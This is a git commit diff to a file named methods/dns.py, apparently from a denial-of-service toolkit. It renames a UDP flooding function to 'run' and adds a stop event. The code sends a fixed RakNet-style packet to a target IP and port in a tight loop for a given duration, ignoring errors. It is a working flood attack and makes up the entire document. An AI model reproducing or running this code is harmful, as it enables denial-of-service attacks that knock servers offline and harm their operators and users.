53992696e51140dbb23b4fef94a15c3cbac48890
zJonch14 <bot324095@gmail.com>
2025-08-04 10:43:38 -0300

    Update dns.py

--- methods/dns.py
+++ methods/dns.py
@@ -1,19 +1,16 @@
 import socket
 import time
 
-def raknet_dnsflood(ip, port, duration):
+def run(ip, port, duration, stop_event=None):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
-
-    # Paquete tipo RakNet simple
     raknet_packet = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
 
-    while time.time() < end_time:
-        try:
-            sock.sendto(raknet_packet, (ip, port))
-        except Exception:
-            pass  # Ignorar errores
-    sock.close()
-
-# Ejemplo de uso:
-# raknet_dnsflood('IP', PORT, TIEMPO)
+    try:
+        while (stop_event is None or not stop_event.is_set()) and time.time() < end_time:
+            try:
+                sock.sendto(raknet_packet, (ip, port))
+            except Exception:
+                pass  # Ignorar errores
+    finally:
+        sock.close()
